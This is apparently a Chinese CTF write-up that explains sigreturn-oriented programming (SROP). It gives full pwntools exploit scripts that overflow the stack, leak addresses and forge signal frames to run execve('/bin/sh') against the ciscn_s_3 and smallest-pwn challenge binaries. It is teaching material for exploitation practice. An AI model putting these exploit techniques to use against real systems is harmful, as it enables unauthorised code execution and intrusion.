
# [原创] SROP分析及例题

## 原理与利用

<mark class="encrypted">bcfK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0N6r3k6Q4x3X3c8%4K9h3E0A6i4K6u0W2k6$3W2@1K9s2g2T1i4K6u0W2K9h3!0Q4x3V1k6U0N6r3k6Q4x3X3c8%4K9h3E0A6i4K6u0r3M7s2N6F1i4K6u0r3L8r3W2F1N6i4S2Q4x3V1k6K6N6r3q4U0K9$3!0$3k6i4u0X3L8r3!0%4i4K6u0r3j5h3c8$3j5h3&6U0k6h3c8Q4x3X3c8J5L8%4m8Q4x3X3c8\*7K9q4)9J5c8W2)9J5x3%4y4J5L8%4l9`.</mark>

<mark class="encrypted">363K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8X3I4#2L8%4A6Z5j5h3!0@1K9h3q4F1i4K6u0r3j5i4u0@1K9h3y4D9k6g2)9J5c8X3c8W2N6r3q4A6L8s2y4Q4x3V1j5%4z5e0j5H3y4K6f1%4x3R3`.`.</mark>

<mark class="encrypted">daaK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2S2L8Y4q4#2j5h3&6C8k6g2)9J5k6h3y4G2L8g2)9J5c8Y4m8G2M7%4c8Q4x3V1k6A6k6q4)9J5c8U0R3#2z5o6p5H3</mark>

<mark class="encrypted">9c5K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2X3M7X3g2W2j5Y4g2X3i4K6u0W2j5$3!0E0i4K6u0r3j5i4u0@1K9h3y4D9k6i4y4Q4x3V1k6F1k6i4c8%4L8%4u0C8i4K6u0r3z5o6M7@1y4o6N6Q4x3X3g2Z5N6r3#2D9</mark>

其中的重点就是

---

需要注意的是，我们在构造 `ROP` 攻击的时候，需要满足下面的条件

1. 可以通过栈溢出来控制栈的内容

2. 需要知道相应的地址

   - `"/bin/sh"`
   - `Signal Frame`
   - `syscall`
   - `sigreturn`

3. 需要有够大的空间来塞下整个 sigal frame

---

1. `Signal Frame` 被保存在用户的地址空间中，所以用户是可以读写的。

2. 由于内核与信号处理程序无关 (kernel agnostic about signal handlers)，它并不会去记录这个 signal 对应的 `Signal Frame`，所以当执行 `sigreturn` 系统调用时，此时的 `Signal Frame` 并不一定是之前内核为用户进程保存的 `Signal Frame`。

---

32 位的 `sigreturn` 的调用号为 77；在 64 位系统中，`sigreturn` 系统调用对应的系统调用号为 15。寄存器 `eax` 中存放系统调用号，同时系统调用返回值也存放在 `eax` 中。

以 64 位系统为例，只需要 `RAX=15`，并且执行 `syscall` 即可实现调用 `sigreturn` 调用。而 `RAX` 寄存器的值又可以通过控制某个函数的返回值来间接控制，比如说 `read` 函数的返回值为读取的字节数。

```
/*for x86*/
mov eax,0x77
int 80h
/*for x86_64*/
mov rax,0xf
syscall
```

---

1. 伪造 `sigcontext` 结构，`push` 到栈中。伪造过程中需要将 `eax`、`ebx`、`ecx` 等参数寄存器设置为相关值，`eip` 设置为 `syscall` 的地址。并且需要注意的是 `esp`、`ebp` 和 `es`、`gs` 等段寄存器不可直接设置为 0，经过个人测试，这样不会成功。

2. 然后将返回地址设置为 `sigreturn` 的地址（或者相关 `gadget`）。

3. 最后当 `sigreturn` 系统调用执行完后，就直接执行你的系统调用了。

```
| sig_ret| <---esp
| .......|
|        |
| frame  |
|........|
|        |
——————————
```

## 例子

### ciscn_s_3 （64位）

#### 分析

保护全开

![](upload/attach/202003/840734_RECVH2QS7Y2TJEY.jpg)

由汇编代码可得调用了 `read(fd, &buf, 0x400)` `write(fd, &buf, 0x30)`

存在溢出

本题中存在的对栈的处理 `pop` `push` 就只有开始的 `push rbp` 和 `ret` = `pop rip`

所以最后返回的 `rip` 被 `rbp` 赋值，我们可以覆盖到 `rbp` 从而改变了返回地址

![](upload/attach/202003/840734_57EJB9ZSMAW5PDB.jpg)

同时还能发现故意设置的 `gadgets`

1. 实现了上述的 `sigreturn` 系统调用

2. `one_gadget`

#### 法一【推荐】

pwntools 中已经集成了对于 srop 的攻击：<mark class="encrypted">5a2K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8$3y4K6i4K6u0W2M7s2N6F1N6r3!0G2L8s2y4Q4x3X3g2U0L8$3#2Q4x3V1k6W2L8W2)9J5c8Y4y4@1j5h3u0D9k6g2)9J5c8Y4u0G2M7q4)9J5c8Y4y4J5L8%4m8Q4x3X3g2Z5N6r3#2D9</mark>

##### exp

```python
#!usr/bin/python
from pwn import *
context(arch='amd64', os='linux', log_level = 'DEBUG')
context.log_level = 'debug'
# io = process('./s3')
io = remote("node3.buuoj.cn",28503)
elf = ELF("./s3")
vuln_addr = 0x00000000004004ED
sigreturn_addr = 0x00000000004004DA
syscall_addr = 0x0000000000400501
payload = "/bin/sh\x00"
payload = payload.ljust(0x10, 'a')
payload += p64(vuln_addr)
io.send(payload)
io.recv(0x20)
binsh_addr = u64(io.recv(8))-280 # 0x00007fffffffde08 - 0x00007fffffffdcf0 = 280
print "binsh_addr = " +hex(binsh_addr)
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr
payload = "/bin/sh\x00"
payload = payload.ljust(0x10, 'a')
payload += p64(sigreturn_addr) + p64(syscall_addr) + str(frame)
io.send(payload)
io.interactive()
```

#### 法二

`execve` 的函数定义

```c
int execve(const char *filename,char * const argv[ ],char * const envp[ ]);
```

所以实际上我们要调用

```c
execve("/bin/sh", 0, 0)
#rdi #rsi #rdx
```

查找 `ropgadget`

```bash
$ ROPgadget --binary s3 --only "pop|ret"
```

没有找到 `rdx`，直接使用 `__libc_csu_init` 传参

![](upload/attach/202003/840734_ZSWCJ5R67KYR66Z.jpg)

比较麻烦

##### exp

```python
#!usr/bin/python
from pwn import *
context.log_level = 'debug'
io = process('./s3')
# io = remote("node3.buuoj.cn",28503)
elf = ELF("./s3")
pop_rdi = 0x00000000004005a3
pop_rsi_r15 = 0x00000000004005a1
pop6 = 0x0000000000400596 # pop_rbx_rbp_r12_r13_r14_r15_ret
ini_addr = 0x0000000000400580
vuln_addr = 0x00000000004004ED
sys_execve = 0x00000000004004E2
syscall_addr = 0x0000000000400501
# syscall_addr = 0x0000000000400517
payload = "/bin/sh\x00"
payload = payload.ljust(0x10, 'a')
payload += p64(vuln_addr)
io.send(payload)
io.recv(0x20)
binsh_addr = u64(io.recv(8))-280 # 0x00007fffffffde08 - 0x00007fffffffdcf0 = 280
print "binsh_addr = " +hex(binsh_addr)
payload = "/bin/sh\x00"
payload = payload.ljust(0x10, 'a')
payload += p64(pop6)
payload += p64(0) + p64(0) + p64(binsh_addr+0x50) + p64(0) + p64(0) + p64(0)
#rbx #rbp #r12 #r13=rdx #r14=rsi #r15
payload += p64(ini_addr) + p64(sys_execve) # rax = 0x3b
payload += p64(pop_rdi) + p64(binsh_addr) + p64(syscall_addr)
io.send(payload)
io.interactive()
```

> 参考 ：<mark class="encrypted">dc9K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6\*7K9s2g2S2L8X3I4S2L8W2)9J5k6i4A6Z5K9h3S2#2i4K6u0W2j5$3!0E0i4K6u0r3M7q4)9J5c8U0p5H3y4U0l9I4y4o6t1K6y4l9`.`.</mark>

### Defcon 2015 Qualifier fuckup （32位）

看了一下，整个二进制文件都分析不清楚，只能 get 到漏洞点

32 位牵扯到了 `VDSO`

<mark class="encrypted">a9aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6U0N6r3k6K6i4K6u0r3N6%4u0A6N6r3g2Q4x3X3c8#2M7s2y4Q4x3X3b7J5x3o6p5#2i4K6u0r3N6s2u0W2k6g2)9J5c8X3#2S2M7%4c8W2M7W2)9J5c8X3c8W2k6X3y4G2L8W2)9J5k6s2q4#2j5h3I4A6k6X3W2W2M7W2)9J5k6r3y4@1k6W2)9J5k6o6t1H3x3e0g2Q4x3V1k6H3N6$3&6S2j5X3I4W2i4K6u0r3k6Y4g2U0K9%4g2H3</mark>

<mark class="encrypted">242K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3u0A6L8X3A6S2i4K6u0W2k6$3W2@1K9s2g2T1i4K6u0W2K9h3!0Q4x3V1j5J5x3o6p5#2i4K6u0r3x3o6g2Q4x3V1j5I4z5g2)9J5c8X3c8W2k6X3y4G2L8X3y4@1k6U0t1H3x3e0g2Q4x3X3c8X3N6h3y4C8N6i4m8Q4x3X3c8%4M7X3W2@1k6i4g2H3i4K6u0r3</mark>

### 360春秋杯 smallest-pwn

#### 分析

ida 少的可怜，总之实现了 `read(0, $rsp, 0x400)`

#### 法一

没有给我们可用的 `sigreturn`，这就用到前文说的：

> 以 64 位系统为例，只需要 `RAX=15`，并且执行 `syscall` 即可实现调用 `sigreturn` 调用。而 `RAX` 寄存器的值又可以通过控制某个函数的返回值来间接控制，比如说 `read` 函数的返回值为读取的字节数。

我们希望通过 `syscall` 调用 `execve("/bin/sh", 0, 0)` 跟第一题有点像哈

---

1. 第一次 `read` 时将 `rsp` 写成 `start_addr`，然后又返回 `start_addr` 再次写入 `'\xB3'`，`read` 返回真正写入数 `1` 给 `rax`，同时将 `rsp` 最末位改成了 `B3`，即 `rsp = 0x4000B3`，跳过了 `xor rax, rax`。  
   `write` 函数调用号就是 `1`，`stdout` 的值也是 `1`，`mov rdi, rax` 刚好会设置好 `write` 的第一个参数，调用 `write(1, $rsp, 0x400)` 即可泄露 `stack_addr`。

2. 通过设置 `read` 返回字节数控制 `rax = 15`，从而调用 `sigreturn`。

3. 在栈地址中写入 `binsh` 字符串。

4. 构造 `execve("/bin/sh", 0, 0)`。

将 `rax` 设置成 59（即 `execve` 系统调用号），将 `rdi` 设置成字符串 `/bin/sh` 的地址（我们写在栈上了），将 `rip` 设置成系统调用指令 `syscall` 的内存地址，最后，将 `rt_sigreturn` 手动设置成 `sigreturn` 系统调用的内存地址。那么，当这个伪造的 `sigreturn` 系统调用返回之后，相应的寄存器就被设置成了攻击者可以控制的值，一旦 `sigreturn` 返回，就会去执行 `execve` 系统调用，打开一个 shell。

##### exp

```python
#!usr/bin/python
from pwn import *
context(arch='amd64', os='linux', log_level = 'DEBUG')
context.log_level = 'debug'
io = process("./smallest")
start_addr = 0x00000000004000B0
vuln_addr = 0x00000000004000B3
syscall_addr = 0x00000000004000BE
payload = p64(start_addr) * 3
io.send(payload)
io.send('\xB3') # rax = 1 -->write(1, $rsp, 0x400)
io.recv(8)
stack_addr = u64(io.recv(8))
print "stack_addr = " +hex(stack_addr)
frame = SigreturnFrame()
frame.rax = constants.SYS_read
frame.rdi = 0
frame.rsi = stack_addr
frame.rdx = 0x400
frame.rsp = stack_addr
frame.rip = syscall_addr
# read(0, stack_addr, 0x400)
payload = p64(start_addr) + p64(0) + str(frame)
io.send(payload)
payload = p64(syscall_addr)
payload = payload.ljust(15, "\x00") # rax = 15
io.send(payload)
# start sigreturn
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = stack_addr + 0x150 # binsh
frame.rsi = 0
frame.rdx = 0
frame.rsp = stack_addr
frame.rip = syscall_addr
payload = p64(start_addr) + p64(0) + str(frame)
payload = payload.ljust(0x150, '\x00')
payload += "/bin/sh\x00"
io.send(payload)
payload = p64(syscall_addr)
payload = payload.ljust(15, "\x00") # rax = 15
io.send(payload)
# start sigreturn
io.interactive()
```

#### 法二

SROP + mprotect + shellcode
